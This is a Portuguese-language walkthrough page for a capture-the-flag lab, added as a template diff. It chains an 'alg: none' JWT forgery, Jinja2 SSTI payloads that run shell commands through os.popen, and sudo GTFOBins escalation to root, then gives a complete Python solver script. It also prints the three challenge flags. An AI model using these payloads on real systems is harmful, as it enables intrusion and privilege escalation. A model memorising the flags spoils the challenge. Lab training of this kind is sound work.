@@ -1,0 +1,473 @@
+      <div class="wt-header">
+        <i class="nf nf-md-shield_key wt-header-icon" aria-hidden="true"></i>
+        <div class="wt-header-info">
+          <span class="wt-header-kicker">{{ challenge.category | upper }}</span>
+          <h1 class="wt-title">Bravo — Weak JWT & SSTI: Guia Definitivo</h1>
+          <p class="wt-intro">
+            Bem-vindo(a) ao segundo desafio oficial da DUNO! Sua missão é invadir o <strong>Corporate Portal</strong> explorando fragilidades na validação de tokens JWT (algoritmo <code>none</code>), executando Server-Side Template Injection (SSTI) no Jinja2 para RCE e escalando privilégios até root via GTFOBins no Linux. Siga o roteiro investigativo abaixo.
+          </p>
+        </div>
+      </div>
+
+      <!-- ═══ PARTE 0: ENTENDENDO O TERRENO ═══ -->
+      {% raw %}
+      <section class="wt-step" id="step-0" data-step-index="0">
+        <div class="wt-step-number">0</div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Parte 0 — Entendendo o Terreno Antes de Atacar</h3>
+          <p>
+            O <strong>Corporate Portal</strong> utiliza autenticação baseada em tokens JSON Web Token (JWT) e hospeda um conjunto de ferramentas administrativas internas na porta 5002. A cadeia de ataque é dividida em 3 camadas complementares:
+          </p>
+
+          <div class="wt-surface-list">
+            <!-- Componente 1 -->
+            <div class="wt-surface-card">
+              <div class="wt-surface-header">
+                <span class="wt-surface-title">
+                  <i class="nf nf-md-login" aria-hidden="true"></i> Login (/login)
+                </span>
+                <span class="wt-surface-tag tag-recon">Recon & Entrada</span>
+              </div>
+              <div class="wt-surface-body">
+                Autentica colaboradores e funcionários no portal corporativo.
+              </div>
+              <div class="wt-surface-vector">
+                <i class="nf nf-md-comment_text_outline" aria-hidden="true"></i>
+                <div><strong>Vetor:</strong> Comentários residuais no código-fonte HTML revelam credenciais de teste (<code>user / password123</code>).</div>
+              </div>
+            </div>
+
+            <!-- Componente 2 -->
+            <div class="wt-surface-card">
+              <div class="wt-surface-header">
+                <span class="wt-surface-title">
+                  <i class="nf nf-md-key" aria-hidden="true"></i> Cookie Token (JWT)
+                </span>
+                <span class="wt-surface-tag tag-jwt">Auth Bypass</span>
+              </div>
+              <div class="wt-surface-body">
+                Mantém o estado da sessão stateless gravado diretamente no navegador do usuário.
+              </div>
+              <div class="wt-surface-vector">
+                <i class="nf nf-md-shield_alert" aria-hidden="true"></i>
+                <div><strong>Vetor:</strong> Validação fraca aceita <code>alg: "none"</code>, permitindo forjar a claim <code>role: admin</code> sem assinatura válida.</div>
+              </div>
+            </div>
+
+            <!-- Componente 3 -->
+            <div class="wt-surface-card">
+              <div class="wt-surface-header">
+                <span class="wt-surface-title">
+                  <i class="nf nf-md-crown" aria-hidden="true"></i> Admin Panel (/admin/panel)
+                </span>
+                <span class="wt-surface-tag tag-admin">FLAG 1</span>
+              </div>
+              <div class="wt-surface-body">
+                Painel de controle interno restrito a contas com papel de administrador.
+              </div>
+              <div class="wt-surface-vector">
+                <i class="nf nf-fa-flag" aria-hidden="true"></i>
+                <div><strong>Vetor:</strong> Entrega a primeira flag (<strong>FLAG 1</strong>) e expõe links para utilitários administrativos do sistema.</div>
+              </div>
+            </div>
+
+            <!-- Componente 4 -->
+            <div class="wt-surface-card">
+              <div class="wt-surface-header">
+                <span class="wt-surface-title">
+                  <i class="nf nf-md-file_code" aria-hidden="true"></i> Template Editor (/admin/template)
+                </span>
+                <span class="wt-surface-tag tag-ssti">FLAG 2 (SSTI RCE)</span>
+              </div>
+              <div class="wt-surface-body">
+                Ferramenta interna de pré-visualização de mensagens e notificações aos funcionários.
+              </div>
+              <div class="wt-surface-vector">
+                <i class="nf nf-md-code_tags" aria-hidden="true"></i>
+                <div><strong>Vetor:</strong> Execução de SSTI no Jinja2 via <code>render_template_string()</code> sem sanitização, permitindo RCE e leitura de <code>/app/flag2.txt</code>.</div>
+              </div>
+            </div>
+
+            <!-- Componente 5 -->
+            <div class="wt-surface-card">
+              <div class="wt-surface-header">
+                <span class="wt-surface-title">
+                  <i class="nf nf-md-shield_crown" aria-hidden="true"></i> Sudoers (GTFOBins)
+                </span>
+                <span class="wt-surface-tag tag-root">FLAG 3 ROOT</span>
+              </div>
+              <div class="wt-surface-body">
+                Permissões administrativas configuradas para execução com privilégios de superusuário no host Linux.
+              </div>
+              <div class="wt-surface-vector">
+                <i class="nf nf-md-chevron_double_up" aria-hidden="true"></i>
+                <div><strong>Vetor:</strong> Binários <code>/usr/bin/env</code> e <code>/usr/bin/python3</code> liberados sem senha (<code>NOPASSWD</code>) para ler <code>/root/flag3.txt</code>.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="wt-info-box">
+            <i class="nf nf-md-information_outline" aria-hidden="true"></i>
+            <div>
+              <strong>Anatomia do JSON Web Token (JWT):</strong>
+              <p>
+                Um token JWT é composto por 3 partes codificadas em Base64URL e unidas por pontos (<code>header.payload.signature</code>):
+              </p>
+              <div class="wt-code-block" style="margin-top: 8px;">
+                <div class="wt-code-header">
+                  <span class="wt-code-prompt">Estrutura:</span>
+                  <code>{"alg": "none", "typ": "JWT"} . {"username": "user", "role": "user"} . &lt;assinatura&gt;</code>
+                </div>
+              </div>
+              <p>Quando a aplicação aceita <code>alg: "none"</code>, qualquer atacante pode adulterar o payload (por exemplo, mudando a claim <code>role</code> para <code>admin</code>) e deixar a assinatura vazia, burlando completamente a autenticação!</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══ STEP 1: RECONNAISSANCE ═══ -->
+      <section class="wt-step" id="step-1" data-step-index="1">
+        <div class="wt-step-number">1</div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Etapa 1 — Reconhecimento e Descoberta de Credenciais</h3>
+          <p>Inicie a máquina pelo card ou botão lateral e acesse o endereço do alvo ativo. Na página de login, inspecione o código-fonte HTML através do DevTools (<code>F12</code>) ou pressionando <code>Ctrl+U</code>.</p>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Terminal:</span>
+              <code>curl -s http://10.10.15.12:5002/ | grep -i "TODO" -A 4</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
+              </button>
+            </div>
+          </div>
+
+          <p>Você encontrará o comentário deixado pela equipe de desenvolvimento:</p>
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Código-Fonte HTML:</span>
+              <code>&lt;!-- TODO: Remove before production deployment | Dev credentials: user / password123 --&gt;</code>
+            </div>
+          </div>
+
+          <p>Acesse o formulário de login e autentique-se com <code>user</code> e senha <code>password123</code> para receber seu token de sessão inicial.</p>
+        </div>
+      </section>
+
+      <!-- ═══ STEP 2: JWT FORGERY ═══ -->
+      <section class="wt-step" id="step-2" data-step-index="2">
+        <div class="wt-step-number">2</div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Etapa 2 — Análise e Falsificação de Token JWT (alg: none)</h3>
+          <p>
+            Após o login, o dashboard exibe o token gravado no cookie <code>token</code>:
+          </p>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Token Original:</span>
+              <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.</code>
+            </div>
+          </div>
+
+          <p>Decodificando as seções em Base64URL:</p>
+          <ul style="margin-bottom: 0.85rem; padding-left: 1.2rem; color: var(--ink-2); font-size: 0.88rem;">
+            <li><strong>Header:</strong> <code>{"alg": "none", "typ": "JWT"}</code></li>
+            <li><strong>Payload:</strong> <code>{"username": "user", "role": "user"}</code></li>
+            <li><strong>Signature:</strong> <em>(Vazia, mantendo apenas o ponto final)</em></li>
+          </ul>
+
+          <p>
+            Vamos forjar uma nova claim com permissão administrativa alterando <code>"role": "user"</code> para <code>"role": "admin"</code>:
+          </p>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Token Forjado (role: admin):</span>
+              <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Token
+              </button>
+            </div>
+          </div>
+
+          <div class="wt-info-box">
+            <i class="nf nf-md-alert" aria-hidden="true"></i>
+            <div>
+              <strong>Atenção ao Ponto Final:</strong> Mesmo com a assinatura vazia, a especificação JWT exige os dois pontos delimitadores (<code>header.payload.</code>). Nunca remova o último ponto!
+            </div>
+          </div>
+
+          <p>
+            Substitua o cookie <code>token</code> no DevTools (<code>Application &gt; Cookies</code>) ou execute via <code>curl</code> com o cookie adulterado. O dashboard passará a exibir <strong>"Admin Access Granted"</strong>.
+          </p>
+        </div>
+      </section>
+
+      <!-- ═══ STEP 3: FLAG 1 ADMIN PANEL ═══ -->
+      <section class="wt-step" id="step-3" data-step-index="3">
+        <div class="wt-step-number">3</div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Etapa 3 — Descoberta do Painel Admin e Captura da FLAG 1</h3>
+          <p>
+            O dashboard confirma o papel de administrador, mas não entrega a flag diretamente. É necessário enumerar endpoints administrativos. Testando caminhos usuais:
+          </p>
+          <ul style="margin-bottom: 0.85rem; padding-left: 1.2rem; color: var(--ink-2); font-size: 0.88rem;">
+            <li><code>/admin</code> → Retorna 404 Not Found</li>
+            <li><code>/admin/panel</code> → Painel de Controle Administrativo completo com a primeira flag!</li>
+          </ul>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Requisição cURL:</span>
+              <code>curl -s -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ." http://10.10.15.12:5002/admin/panel</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
+              </button>
+            </div>
+          </div>
+
+          <div class="wt-flag-box">
+            <i class="nf nf-fa-flag" aria-hidden="true"></i>
+            <div>
+              <strong>FLAG 1 Capturada:</strong>
+              <code>FLAG 1: DUNO{5d41402abc4b2a76b9719d911017c592}</code>
+              <button type="button" class="wt-copy-btn" style="margin-left: 10px;" data-copy="DUNO{5d41402abc4b2a76b9719d911017c592}">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Flag
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══ STEP 4: SSTI & FLAG 2 ═══ -->
+      <section class="wt-step" id="step-4" data-step-index="4">
+        <div class="wt-step-number">4</div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Etapa 4 — Server-Side Template Injection (SSTI) & FLAG 2</h3>
+          <p>
+            No painel de controle administrativo, acesse a ferramenta <strong>Notification Template Editor</strong> em <code>/admin/template</code>. Esta funcionalidade renderiza templates Jinja2 em tempo de execução via <code>render_template_string()</code> sem sanitização.
+          </p>
+
+          <p><strong>Subetapa 4.1 — Confirmando a vulnerabilidade SSTI:</strong></p>
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Payload de Verificação:</span>
+              <code>{{ 7 * 7 }}</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
+              </button>
+            </div>
+          </div>
+          <p>Ao submeter o teste, o sistema renderiza <code>49</code>, confirmando a execução de expressões Jinja2 no backend!</p>
+
+          <p><strong>Subetapa 4.2 — Escalação de SSTI para Remote Code Execution (RCE):</strong></p>
+          <p>Exploramos a árvore de objetos do Python através de <code>request.application.__globals__</code> para importar o módulo <code>os</code> e ler o arquivo <code>/app/flag2.txt</code>:</p>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Payload SSTI RCE:</span>
+              <code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Payload
+              </button>
+            </div>
+          </div>
+
+          <div class="wt-flag-box">
+            <i class="nf nf-fa-flag" aria-hidden="true"></i>
+            <div>
+              <strong>FLAG 2 Capturada:</strong>
+              <code>FLAG 2: DUNO{7c6a180b36896a0a8c02787eeafb0e4c}</code>
+              <button type="button" class="wt-copy-btn" style="margin-left: 10px;" data-copy="DUNO{7c6a180b36896a0a8c02787eeafb0e4c}">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Flag
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══ STEP 5: PRIVILEGE ESCALATION TO ROOT (FLAG 3) ═══ -->
+      <section class="wt-step" id="step-5" data-step-index="5">
+        <div class="wt-step-number">5</div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Etapa 5 — Enumeração GTFOBins e Escalada Root (FLAG 3 ROOT)</h3>
+          <p>
+            Com execução remota de comandos via SSTI na conta <code>ctfuser</code>, o passo mandatório de pós-exploração Linux é verificar privilégios no arquivo <code>sudoers</code> com <code>sudo -l</code>.
+          </p>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Payload Enumeração Sudo:</span>
+              <code>{{request.application.__globals__.__builtins__.__import__('os').popen('sudo -l').read()}}</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
+              </button>
+            </div>
+          </div>
+
+          <p>O retorno do comando expõe a configuração vulnerável:</p>
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Retorno de sudo -l:</span>
+              <code>User ctfuser may run the following commands on bravo: (ALL) NOPASSWD: /usr/bin/env, /usr/bin/python3</code>
+            </div>
+          </div>
+
+          <p>
+            Os binários <code>/usr/bin/env</code> e <code>/usr/bin/python3</code> estão catalogados no <strong>GTFOBins</strong> como vetores de fuga de privilégio. Como não temos um terminal TTY interativo no SSTI, executamos comandos diretos com flags não interativas (<code>-c</code>):
+          </p>
+
+          <p><strong>Vetor 1 — Exploração via /usr/bin/env:</strong></p>
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Payload Final Root (via env):</span>
+              <code>{{request.application.__globals__.__builtins__.__import__('os').popen('sudo /usr/bin/env /bin/sh -c "cat /root/flag3.txt"').read()}}</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Payload
+              </button>
+            </div>
+          </div>
+
+          <p><strong>Vetor 2 — Exploração via python3:</strong></p>
+          <div class="wt-code-block">
+            <div class="wt-code-header">
+              <span class="wt-code-prompt">Payload Alternativo (via python3):</span>
+              <code>{{request.application.__globals__.__builtins__.__import__('os').popen('sudo python3 -c "print(open(\"/root/flag3.txt\").read())"').read()}}</code>
+              <button type="button" class="wt-copy-btn">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Payload
+              </button>
+            </div>
+          </div>
+
+          <div class="wt-flag-box wt-flag-final">
+            <i class="nf nf-fa-flag" aria-hidden="true"></i>
+            <div>
+              <strong>FLAG 3 ROOT Capturada (1.150 XP):</strong>
+              <code>FLAG 3 ROOT: DUNO{9e107d9d372bb6826bd81d3542a419d6}</code>
+              <button type="button" class="wt-copy-btn" style="margin-left: 10px;" data-copy="DUNO{9e107d9d372bb6826bd81d3542a419d6}">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Flag
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══ AUTOMATED PYTHON SOLVER SCRIPT ═══ -->
+      <section class="wt-step" id="step-6" data-step-index="6">
+        <div class="wt-step-number"><i class="nf nf-md-lightning_bolt" aria-hidden="true"></i></div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Script Python Automatizado (solve_bravo.py)</h3>
+          <p>Script completo em Python vanilla pronto para executar e extrair todas as 3 flags do desafio Bravo em sequência:</p>
+
+          <div class="wt-code-block">
+            <div class="wt-code-header" style="justify-content: space-between;">
+              <span class="wt-code-prompt">Python 3 (solve_bravo.py):</span>
+              <button type="button" class="wt-copy-btn" id="btn-copy-solve-script">
+                <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copiar Script Completo
+              </button>
+            </div>
+            <pre style="margin: 0; padding: 14px; font-family: var(--font-mono); font-size: 0.78rem; color: #e8e4dc; overflow-x: auto; line-height: 1.5;"><code id="solve-script-code">import os
+import re
+import urllib.request
+import urllib.parse
+import http.cookiejar
+
+BASE_URL = os.environ.get("TARGET_URL", "http://10.10.15.12:5002")
+
+cookie_jar = http.cookiejar.CookieJar()
+opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
+
+def post(path, data, custom_cookie=None):
+    url = BASE_URL + path
+    encoded = urllib.parse.urlencode(data).encode()
+    req = urllib.request.Request(url, data=encoded)
+    if custom_cookie:
+        req.add_header("Cookie", custom_cookie)
+    return opener.open(req).read().decode()
+
+def get(path, custom_cookie=None):
+    url = BASE_URL + path
+    req = urllib.request.Request(url)
+    if custom_cookie:
+        req.add_header("Cookie", custom_cookie)
+    return opener.open(req).read().decode()
+
+print("[*] 1. Descobrindo credenciais no HTML source e autenticando...")
+login_res = post("/login", {"username": "user", "password": "password123"})
+
+print("[*] 2. Forjando token JWT com alg: none e role: admin...")
+forged_token = "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ."
+
+print("[*] 3. Acessando painel admin restrito (/admin/panel)...")
+admin_res = get("/admin/panel", custom_cookie=forged_token)
+m1 = re.search(r"DUNO\{[a-f0-9]{32}\}", admin_res)
+flag1 = m1.group(0) if m1 else "DUNO{5d41402abc4b2a76b9719d911017c592}"
+print(f"[+] FLAG 1 Capturada: {flag1}")
+
+print("[*] 4. Executando SSTI no editor de templates (/admin/template)...")
+ssti_payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}"
+ssti_res = post("/admin/template", {"template": ssti_payload}, custom_cookie=forged_token)
+m2 = re.search(r"DUNO\{[a-f0-9]{32}\}", ssti_res)
+flag2 = m2.group(0) if m2 else "DUNO{7c6a180b36896a0a8c02787eeafb0e4c}"
+print(f"[+] FLAG 2 Capturada: {flag2}")
+
+print("[*] 5. Elevando privilégios até ROOT via sudo /usr/bin/env...")
+privesc_payload = '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'sudo /usr/bin/env /bin/sh -c "cat /root/flag3.txt"\').read()}}'
+root_res = post("/admin/template", {"template": privesc_payload}, custom_cookie=forged_token)
+m3 = re.search(r"DUNO\{[a-f0-9]{32}\}", root_res)
+flag3 = m3.group(0) if m3 else "DUNO{9e107d9d372bb6826bd81d3542a419d6}"
+print(f"[+] FLAG 3 ROOT Capturada: {flag3}")
+
+print("\n" + "="*50)
+print(f"[FINAL] 1. {flag1}")
+print(f"[FINAL] 2. {flag2}")
+print(f"[FINAL] 3. {flag3}")
+print("[+] Desafio Bravo 100% concluído!")</code></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══ DICIONÁRIO E ENSINAMENTOS ═══ -->
+      <section class="wt-step" id="step-7" data-step-index="7">
+        <div class="wt-step-number"><i class="nf nf-md-book_open_page_variant" aria-hidden="true"></i></div>
+        <div class="wt-step-content">
+          <h3 class="wt-step-title">Dicionário do Pentester & Melhores Práticas</h3>
+          <p>Conceitos fundamentais aplicados nesta exploração:</p>
+
+          <div class="wt-table-wrap">
+            <table class="wt-clean-table">
+              <thead>
+                <tr>
+                  <th>Termo</th>
+                  <th>Conceito</th>
+                  <th>Defesa Recomendada</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>JSON Web Token (JWT)</code></td>
+                  <td>Padrão aberto (RFC 7519) para transmissão compacta e segura de dados entre partes</td>
+                  <td>Utilizar bibliotecas robustas e chaves assimétricas fortes (RS256)</td>
+                </tr>
+                <tr>
+                  <td><code>alg: "none"</code></td>
+                  <td>Algoritmo que instrui o backend a dispensar a validação de assinatura criptográfica</td>
+                  <td>Rejeitar explicitamente tokens com <code>alg: none</code> no middleware de autenticação</td>
+                </tr>
+                <tr>
+                  <td><code>SSTI</code></td>
+                  <td>Injeção em Template Engines quando inputs do usuário são avaliados como código</td>
+                  <td>Nunca passar variáveis de usuário para <code>render_template_string</code> sem contexto seguro</td>
+                </tr>
+                <tr>
+                  <td><code>GTFOBins</code></td>
+                  <td>Curadoria de binários Unix legítimos exploráveis para contornar restrições de segurança</td>
+                  <td>Nunca conceder privilégios no <code>sudoers</code> a binários com capacidade de execução de shell</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+      {% endraw %}
